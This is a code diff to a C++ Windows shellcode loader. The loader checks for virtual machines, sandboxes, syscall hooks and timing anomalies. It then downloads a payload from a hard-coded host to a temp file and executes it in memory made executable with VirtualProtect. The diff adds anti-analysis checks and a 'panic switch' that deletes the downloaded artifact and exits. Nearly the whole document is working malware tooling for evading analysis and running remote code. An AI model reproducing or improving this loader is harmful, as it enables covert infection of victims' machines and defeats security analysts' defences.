@@ -5,8 +5,10 @@
 #include <vector>
 #include <string>
 #include <set> 
+#include <wininet.h>
 
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "wininet.lib")
 
 bool IsHookedFunction(PVOID functionAddress)
 {
@@ -205,7 +207,8 @@ bool DetectVMArtifacts() {
         L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
     };
 
-    std::vector<std::wstring> filesCheck = {
+    // Files to check
+    std::vector<std::wstring> filesToCheck = {
         L"C:\\Windows\\system32\\drivers\\VBoxMouse.sys",
         L"C:\\Windows\\system32\\drivers\\VBoxGuest.sys",
         L"C:\\Windows\\system32\\drivers\\VBoxSF.sys",
@@ -232,7 +235,7 @@ bool DetectVMArtifacts() {
     }
 
     // Check file existence
-    for (const auto& file : filesCheck) {
+    for (const auto& file : filesToCheck) {
         if (CheckFileExists(file)) {
             std::wcout << L"Detected VM artifact in file: " << file << std::endl;
             return true;
@@ -266,43 +269,100 @@ bool DetectSandboxEnvironment() {
         }
     }
     else {
-        std::cerr << "Failed retrieve display settings" << std::endl;
+        std::cerr << "Failed to retrieve display settings" << std::endl;
     }
 
     return false;
 }
 
+bool DetectPerform() {
+    LARGE_INTEGER frequency, start, end;
+    QueryPerformanceFrequency(&frequency);
+    QueryPerformanceCounter(&start);
+    Sleep(500); 
+    QueryPerformanceCounter(&end);
+    double elapsedTime = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;
+
+    if (elapsedTime > 0.6) { // Expecting around 0.5 seconds
+        std::cerr << "Performance issues detected\n";
+        return true;
+    }
+    return false;
+}
+
+
+bool DetectInternetConnection() {
+    DWORD flags;
+    if (!InternetGetConnectedState(&flags, 0)) {
+        std::cerr << "No internet connection detected!\n";
+        return true;
+    }
+
+    return false;
+}
+
+void PanicSwitch() {
+    std::cerr << "Panic switch activated! Destroying artifacts...\n";
+
+    // Delete temporary files
+    DeleteFile(L"C:\\Windows\\Temp\\shellcode.bin");
+
+    // Terminate current process
+    ExitProcess(1);
+}
 
 int main() {
-    const wchar_t* domain = L"192.168.15.47"; 
+    const wchar_t* domain = L"192.168.15.47"; // Replace with the real domain
     const wchar_t* path = L"/loader.bin";
     const wchar_t* outputFilePath = L"C:\\Windows\\Temp\\shellcode.bin";
 
+    // Kill-switch: Check if the domain is online
     if (!isDomainOnline(domain)) {
         std::cerr << "Domain offline\n";
+        PanicSwitch();
         return 1;
     }
 
+    // Detect VM
     if (DetectVMArtifacts()) {
         std::cerr << "VM artifacts detected. Exiting...\n";
+        PanicSwitch();
         return 1;
     }
-  
+
+    // Detect Sandbox
     if (DetectSandboxEnvironment()) {
         std::cerr << "Sandbox environment detected. Exiting...\n";
+        PanicSwitch();
         return 1;
     }
 
     std::cout << "No VM or sandbox detected. Proceeding...\n";
 
 
+    // Kill-switch: Detect syscall hooks
     if (isSyscallHooked()) {
         std::cerr << "Syscall hooks detected\n";
+        PanicSwitch();
         return 1;
     }
 
+    if (DetectPerform()) {
+        std::cerr << "Peformance Issues detected\n";
+        PanicSwitch();
+        return 1;
+    }
+
+    // Download the shellcode
     if (!downloadShellcode(domain, path, outputFilePath)) {
         std::cerr << "Failed to download the shellcode\n";
+        PanicSwitch();
+        return 1;
+    }
+
+    if (DetectInternetConnection()) {
+        std::cerr << "No Connection Detected\n";
+        PanicSwitch();
         return 1;
     }
 
@@ -310,6 +370,7 @@ int main() {
     std::ifstream file(outputFilePath, std::ios::binary | std::ios::ate);
     if (!file.is_open()) {
         std::cerr << "Failed to open the shellcode file\n";
+        PanicSwitch();
         return 1;
     }
 
@@ -322,14 +383,17 @@ int main() {
         return 1;
     }
 
+    // Allocate executable memory
     void* execMemory = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!execMemory) {
         std::cerr << "Failed to allocate memory\n";
         return 1;
     }
 
+    // Copy the shellcode into the allocated memory
     memcpy(execMemory, buffer.data(), size);
 
+    // Change memory protection to executable
     DWORD oldProtect;
     if (!VirtualProtect(execMemory, size, PAGE_EXECUTE_READ, &oldProtect)) {
         std::cerr << "Failed to change memory protection\n";
@@ -337,9 +401,11 @@ int main() {
         return 1;
     }
 
+    // Execute the shellcode
     auto shellcodeFunc = reinterpret_cast<void(*)()>(execMemory);
     shellcodeFunc();
 
+    // Clean up memory
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
     return 0;
